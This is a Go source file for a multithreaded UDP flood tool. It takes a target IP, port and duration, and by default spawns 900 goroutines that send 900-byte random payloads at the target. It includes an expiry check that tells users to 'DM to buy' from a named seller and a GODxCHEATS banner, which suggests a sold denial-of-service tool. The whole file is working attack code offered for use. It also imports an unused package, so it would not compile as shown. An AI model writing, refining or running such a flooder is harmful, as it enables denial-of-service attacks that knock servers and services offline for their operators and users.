package main

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"log"
	"math"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

const (
	PayloadSize       = 900
	RandomStringSize  = 999
	DefaultThreadCount = 900
	ExpiryDate        = "2025-02-23"
)

type AttackParams struct {
	IP       string
	Port     int
	Duration int
}

func isExpired() bool {
	expiryTime, err := time.Parse("2006-01-02", ExpiryDate)
	if err != nil {
		log.Fatalf("Failed to parse expiry date: %v", err)
	}
	return time.Now().After(expiryTime)
}

func generateRandomString(size int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789/"
	b := make([]byte, size)
	for i := range b {
		b[i] = charset[randomInt(len(charset))]
	}
	return string(b)
}

func randomInt(max int) int {
	var n uint32
	binary.Read(rand.Reader, binary.BigEndian, &n)
	return int(n) % max
}

func sendUDPPackets(params AttackParams, wg *sync.WaitGroup) {
	defer wg.Done()

	serverAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", params.IP, params.Port))
	if err != nil {
		log.Printf("Failed to resolve UDP address: %v", err)
		return
	}

	conn, err := net.DialUDP("udp", nil, serverAddr)
	if err != nil {
		log.Printf("Failed to create UDP connection: %v", err)
		return
	}
	defer conn.Close()

	startTime := time.Now()
	for time.Since(startTime) < time.Duration(params.Duration)*time.Second {
		payload := generateRandomString(PayloadSize)
		_, err := conn.Write([]byte(payload))
		if err != nil {
			log.Printf("Failed to send UDP packet: %v", err)
			continue
		}
		time.Sleep(100 * time.Millisecond) // Adjust as needed
	}
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: ./test <ip> <port> <duration> [threads]")
		return
	}

	if isExpired() {
		fmt.Println("File expired. DM to buy owner @GODxAloneBOY.")
		return
	}

	params := AttackParams{
		IP:       os.Args[1],
		Port:     atoi(os.Args[2]),
		Duration: atoi(os.Args[3]),
	}

	threadCount := DefaultThreadCount
	if len(os.Args) >= 5 {
		threadCount = atoi(os.Args[4])
		if threadCount <= 0 {
			threadCount = DefaultThreadCount
		}
	}

	fmt.Printf("Using values: IP = %s, Port = %d, Duration = %d seconds, Threads = %d\n",
		params.IP, params.Port, params.Duration, threadCount)

	var wg sync.WaitGroup
	for i := 0; i < threadCount; i++ {
		wg.Add(1)
		go sendUDPPackets(params, &wg)
	}
	wg.Wait()

	fmt.Println("*****************************************")
	fmt.Println("*                                    *")
	fmt.Println("*      ×͜×ㅤ𝙰𝙻𝙾𝙽𝙴ㅤ𝙱𝙾𝚈 ×͜×           *")
	fmt.Println("*   ꧁༒GODxCHEATS༒꧂        *")
	fmt.Println("*                                     *")
	fmt.Println("******************************************")
}

func atoi(s string) int {
	i, err := strconv.Atoi(s)
	if err != nil {
		log.Fatalf("Invalid number: %v", err)
	}
	return i
}